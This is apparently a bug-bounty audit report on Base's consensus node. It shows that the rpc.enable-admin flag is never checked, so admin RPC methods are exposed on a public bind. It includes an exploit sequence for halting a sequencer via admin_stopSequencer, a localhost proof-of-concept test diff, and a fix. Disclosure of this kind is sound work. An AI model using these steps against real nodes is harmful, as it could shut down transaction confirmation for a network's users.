# 75268 bc insight rpc enable admin false does not disable consensus admin rpc methods

**Submitted on Apr 28th 2026 at 07:26:14 UTC by @silverologist for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75268
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Summary

The consensus node exposes the `admin_*` RPC namespace even when `rpc.enable-admin` is left disabled.

`RpcArgs` and `RpcBuilder` both model `rpc.enable-admin` as the flag that should enable the admin API. However, `RpcActor::start()` never checks that flag before merging `AdminRpc` into the live JSON-RPC module set. On Base nodes, the `network_admin` channel is wired unconditionally, and on sequencer nodes the sequencer admin client is also present. As a result, any reachable caller can invoke privileged `admin_*` methods such as `admin_stopSequencer` despite the operator never enabling the admin API.

## Detailed Description

The CLI surface clearly models `rpc.enable-admin` as the switch for the consensus admin API.

In `base/crates/client/cli/src/rpc.rs:30`, the flag is documented as:

* `Enable the admin API.`

That value is propagated into `RpcBuilder.enable_admin` in `base/crates/client/cli/src/rpc.rs:72`, and the consensus RPC config also documents the field the same way in `base/crates/consensus/rpc/src/config.rs:12`.

The problem is that the flag is never enforced when the RPC module set is built.

In `base/crates/consensus/service/src/actors/rpc/actor.rs:119`, `RpcActor::start()` merges `AdminRpc` whenever `network_admin` is present:

```rust
if let Some(network_admin) = network_admin {
    modules.merge(AdminRpc::new(self.sequencer_admin_rpc_client, network_admin).into_rpc())?;
}
```

There is no `self.config.enable_admin` check anywhere in that path.

On real nodes, this condition is satisfied by default. In `base/crates/consensus/service/src/service/node.rs:547`, the node always starts the RPC actor with:

* `network_admin: Some(net_admin_rpc)`

So the admin namespace is mounted whenever the RPC server is enabled, regardless of the flag.

On sequencer nodes, the impact is worse because a real sequencer admin client is also wired. `AdminRpc::admin_stop_sequencer()` in `base/crates/consensus/rpc/src/admin.rs:107` forwards directly into the sequencer admin client, and `stop_sequencer()` in `base/crates/consensus/service/src/actors/sequencer/admin_api_impl.rs:179` sets `self.is_active = false`, which stops sequencing.

The RPC server is also exposed on a public bind by default. `RpcArgs.listen_addr` defaults to `0.0.0.0` and `listen_port` defaults to `9545` in `base/crates/client/cli/src/rpc.rs:24`.

So the effective behavior is:

1. Operator leaves `rpc.enable-admin` unset.
2. Consensus RPC binds publicly on `0.0.0.0:9545`.
3. `RpcActor` mounts the `admin_*` namespace.
4. A remote caller can invoke privileged methods that the operator did not intend to expose.

The critical manifestation is on sequencer nodes, where `admin_stopSequencer` can halt sequencing even though the operator never enabled the admin API, but the same issue applies to the other admin methods.

## Concrete Exploit Sequence

The failure sequence is:

1. Deploy or run a Base sequencer node with RPC enabled and set `rpc.enable-admin` to false in a setting where callers are not trusted.
2. The node binds the consensus RPC server, by default on `0.0.0.0:9545`.
3. Because `RpcActor::start()` keys only on `network_admin`, it still merges `AdminRpc` into the live module set.
4. An untrusted caller sends `admin_stopSequencer` to the node.
5. `AdminRpc::admin_stop_sequencer()` forwards to the sequencer admin client.
6. `stop_sequencer()` sets `is_active = false` and sequencing stops.

At that point the active sequencer can stop producing confirmations even though the operator did not enable the admin API.

## Impact

A remote caller can invoke privileged consensus admin methods on a node whose operator never enabled the admin API.

On a sequencer node, the outcome is that `admin_stopSequencer` can halt sequencing. Under the bounty rules, this maps to:

* `Network not being able to confirm new transactions (total network shutdown)`

## Root Cause

The root cause is a mismatch between configuration intent and RPC module wiring:

1. `RpcArgs` / `RpcBuilder` define `enable_admin` as the admin API gate.
2. `RpcActor::start()` never consults that field.
3. Instead, admin RPC exposure is controlled only by whether `network_admin` is present.
4. `Node::start()` supplies `Some(net_admin_rpc)` unconditionally.

So the code carries an `enable_admin` flag all the way into runtime config, but the live server ignores it when deciding whether to expose `AdminRpc`.

## Recommended Fix

`RpcActor::start()` should gate `AdminRpc` on `self.config.enable_admin` before merging it into the RPC module set.

A minimal fix is to require both:

* `self.config.enable_admin == true`
* `network_admin.is_some()`

before the admin namespace is mounted.

## Proof of Concept

Apply the following git diff to `base/crates/consensus/service/src/actors/rpc/actor.rs` and run as `cargo test -p base-consensus-node test_admin_rpc_exposed_even_when_enable_admin_is_false -- --nocapture`:

```rust
diff --git a/crates/consensus/service/src/actors/rpc/actor.rs b/crates/consensus/service/src/actors/rpc/actor.rs
index c10884f01..cddf16b11 100644
--- a/crates/consensus/service/src/actors/rpc/actor.rs
+++ b/crates/consensus/service/src/actors/rpc/actor.rs
@@ -173,9 +173,131 @@ where
 
 #[cfg(test)]
 mod tests {
-    use std::{net::SocketAddr, num::NonZeroUsize, time::Duration};
+    use std::{
+        net::{SocketAddr, TcpListener},
+        num::NonZeroUsize,
+        sync::{
+            Arc,
+            atomic::{AtomicUsize, Ordering},
+        },
+        time::Duration,
+    };
+
+    use alloy_eips::BlockNumberOrTag;
+    use alloy_primitives::B256;
+    use async_trait::async_trait;
+    use base_consensus_engine::EngineState;
+    use base_consensus_genesis::RollupConfig;
+    use base_consensus_rpc::{AdminApiClient, SequencerAdminAPIError};
+    use base_consensus_safedb::DisabledSafeDB;
+    use base_protocol::{L2BlockInfo, OutputRoot};
+    use jsonrpsee::{
+        core::RpcResult,
+        http_client::HttpClientBuilder,
+        types::{ErrorCode, ErrorObject},
+    };
+    use tokio::{
+        net::TcpStream,
+        sync::{mpsc, watch},
+        time::sleep,
+    };
+    use tokio_util::sync::CancellationToken;
 
     use super::*;
+    use crate::actors::NodeActor;
+
+    #[derive(Clone, Debug)]
+    struct StubEngineRpcClient;
+
+    #[async_trait]
+    impl EngineRpcClient for StubEngineRpcClient {
+        async fn get_config(&self) -> RpcResult<RollupConfig> {
+            Err(ErrorObject::from(ErrorCode::InternalError))
+        }
+
+        async fn get_state(&self) -> RpcResult<EngineState> {
+            Err(ErrorObject::from(ErrorCode::InternalError))
+        }
+
+        async fn output_at_block(
+            &self,
+            _block: BlockNumberOrTag,
+        ) -> RpcResult<(L2BlockInfo, OutputRoot, EngineState)> {
+            Err(ErrorObject::from(ErrorCode::InternalError))
+        }
+
+        async fn dev_get_task_queue_length(&self) -> RpcResult<usize> {
+            Err(ErrorObject::from(ErrorCode::InternalError))
+        }
+
+        async fn dev_subscribe_to_engine_queue_length(&self) -> RpcResult<watch::Receiver<usize>> {
+            Err(ErrorObject::from(ErrorCode::InternalError))
+        }
+
+        async fn dev_subscribe_to_engine_state(&self) -> RpcResult<watch::Receiver<EngineState>> {
+            Err(ErrorObject::from(ErrorCode::InternalError))
+        }
+    }
+
+    #[derive(Debug)]
+    struct StubSequencerAdminClient {
+        stop_calls: Arc<AtomicUsize>,
+        stop_head: B256,
+    }
+
+    #[async_trait]
+    impl SequencerAdminAPIClient for StubSequencerAdminClient {
+        async fn is_sequencer_active(&self) -> Result<bool, SequencerAdminAPIError> {
+            Ok(true)
+        }
+
+        async fn is_conductor_enabled(&self) -> Result<bool, SequencerAdminAPIError> {
+            Ok(false)
+        }
+
+        async fn is_recovery_mode(&self) -> Result<bool, SequencerAdminAPIError> {
+            Ok(false)
+        }
+
+        async fn start_sequencer(&self, _unsafe_head: B256) -> Result<(), SequencerAdminAPIError> {
+            Ok(())
+        }
+
+        async fn stop_sequencer(&self) -> Result<B256, SequencerAdminAPIError> {
+            self.stop_calls.fetch_add(1, Ordering::SeqCst);
+            Ok(self.stop_head)
+        }
+
+        async fn set_recovery_mode(&self, _mode: bool) -> Result<(), SequencerAdminAPIError> {
+            Ok(())
+        }
+
+        async fn override_leader(&self) -> Result<(), SequencerAdminAPIError> {
+            Ok(())
+        }
+
+        async fn reset_derivation_pipeline(&self) -> Result<(), SequencerAdminAPIError> {
+            Ok(())
+        }
+    }
+
+    fn unused_local_addr() -> SocketAddr {
+        let listener =
+            TcpListener::bind(SocketAddr::from(([127, 0, 0, 1], 0))).expect("bind free port");
+        let addr = listener.local_addr().expect("local addr");
+        drop(listener);
+        addr
+    }
+
+    async fn wait_for_listener(addr: SocketAddr) {
+        for _ in 0..50 {
+            if TcpStream::connect(addr).await.is_ok() {
+                return;
+            }
+            sleep(Duration::from_millis(20)).await;
+        }
+        panic!("rpc server did not start listening on {addr}");
+    }
 
     #[tokio::test]
     async fn test_launch_no_modules() {
@@ -214,4 +336,55 @@ mod tests {
         let result = launch(&launcher, modules).await;
         assert!(result.is_ok());
     }
+
+    #[tokio::test]
+    async fn test_admin_rpc_exposed_even_when_enable_admin_is_false() {
+        let socket = unused_local_addr();
+        let stop_calls = Arc::new(AtomicUsize::new(0));
+        let stop_head = B256::repeat_byte(0x42);
+        let cancellation = CancellationToken::new();
+        let (network_admin_tx, _network_admin_rx) = mpsc::channel(1);
+        let (l1_watcher_queries_tx, _l1_watcher_queries_rx) = mpsc::channel(1);
+
+        let actor = RpcActor::new(
+            RpcBuilder {
+                socket,
+                no_restart: true,
+                enable_admin: false,
+                admin_persistence: None,
+                ws_enabled: false,
+                dev_enabled: false,
+                http_timeout: Duration::from_secs(5),
+                max_concurrent_requests: NonZeroUsize::new(32).expect("nonzero"),
+            },
+            StubEngineRpcClient,
+            Some(StubSequencerAdminClient { stop_calls: Arc::clone(&stop_calls), stop_head }),
+            Arc::new(DisabledSafeDB),
+        );
+
+        let actor_handle = tokio::spawn(actor.start(RpcContext {
+            p2p_network: None,
+            network_admin: Some(network_admin_tx),
+            l1_watcher_queries: l1_watcher_queries_tx,
+            cancellation: cancellation.clone(),
+        }));
+
+        wait_for_listener(socket).await;
+
+        let client = HttpClientBuilder::default()
+            .build(format!("http://{socket}"))
+            .expect("build http client");
+
+        let returned_head = client
+            .admin_stop_sequencer()
+            .await
+            .expect("admin RPC should be callable despite enable_admin=false");
+
+        assert_eq!(returned_head, stop_head);
+        assert_eq!(stop_calls.load(Ordering::SeqCst), 1);
+
+        cancellation.cancel();
+        let join_result = actor_handle.await.expect("actor task join");
+        assert!(join_result.is_ok(), "rpc actor should shut down cleanly: {join_result:?}");
+    }
 }
```

The test starts a real `RpcActor` with:

* `enable_admin = false`
* `network_admin = Some(...)`
* a live HTTP RPC server

It then calls `admin_stopSequencer` over JSON-RPC and asserts that the call succeeds and that the sequencer admin stub was actually invoked.
